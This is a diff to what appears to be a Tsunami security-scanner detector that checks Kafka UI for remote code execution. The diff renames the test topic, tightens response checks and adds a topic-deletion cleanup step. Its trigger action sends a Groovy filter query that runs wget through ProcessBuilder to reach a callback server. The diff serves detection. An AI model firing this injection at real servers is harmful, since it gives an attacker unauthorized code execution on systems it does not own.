@@ -50,6 +50,7 @@ actions: {
     }
   }
 }
+
 actions: {
   name: "create_sample_topic"
   http_request: {
@@ -58,22 +59,23 @@ actions: {
     headers: [
       { name: "Content-Type" value: "application/json" }
     ]
-    data: "{\"name\":\"topic\",\"partitions\":1,\"configs\":{\"cleanup.policy\":\"delete\",\"retention.bytes\":\"-1\"}}"
+    data: "{\"name\":\"tsunami-security-scanner\",\"partitions\":1,\"configs\":{\"cleanup.policy\":\"delete\",\"retention.bytes\":\"-1\"}}"
     response: {
-      expect_any: {
+      http_status: 200
+      expect_all: {
         conditions: [
-          { body: {} contains: "org.apache.kafka.common.errors.TopicExistsException: Topic 'topic' already exists." },
-          { body: {} contains: "{\"name\":\"topic\",\"internal\":false,\"partitionCount\":1,\"replicationFactor\":1," }
+          { body: {} contains: "{\"name\":\"tsunami-security-scanner\",\"internal\":false,\"partitionCount\":1,\"replicationFactor\":1," }
         ]
       }
     }
   }
 }
+
 actions: {
   name: "create_sample_messages"
   http_request: {
     method: POST
-    uri: "/api/clusters/local/topics/topic/messages"
+    uri: "/api/clusters/local/topics/tsunami-security-scanner/messages"
     headers: [
       { name: "Content-Type" value: "application/json" }
     ]
@@ -83,11 +85,23 @@ actions: {
     }
   }
 }
+
 actions: {
   name: "trigger_code_execution"
   http_request: {
     method: GET
-    uri: "/api/clusters/local/topics/topic/messages?q=new ProcessBuilder(\"wget\",\"{{ T_CBS_URI }}\").start()&filterQueryType=GROOVY_SCRIPT"
+    uri: "/api/clusters/local/topics/tsunami-security-scanner/messages?q=new ProcessBuilder(\"wget\",\"{{ T_CBS_URI }}\").start()&filterQueryType=GROOVY_SCRIPT"
+  }
+}
+
+actions: {
+  name: "delete_topic"
+  http_request: {
+    method: DELETE
+    uri: "/api/clusters/local/topics/tsunami-security-scanner"
+    response: {
+      http_status: 200
+    }
   }
 }
 
@@ -114,6 +128,7 @@ workflows: {
     "create_sample_messages",
     "trigger_code_execution",
     "sleep",
-    "check_callback_server_logs"
+    "check_callback_server_logs",
+    "delete_topic"
   ]
 }
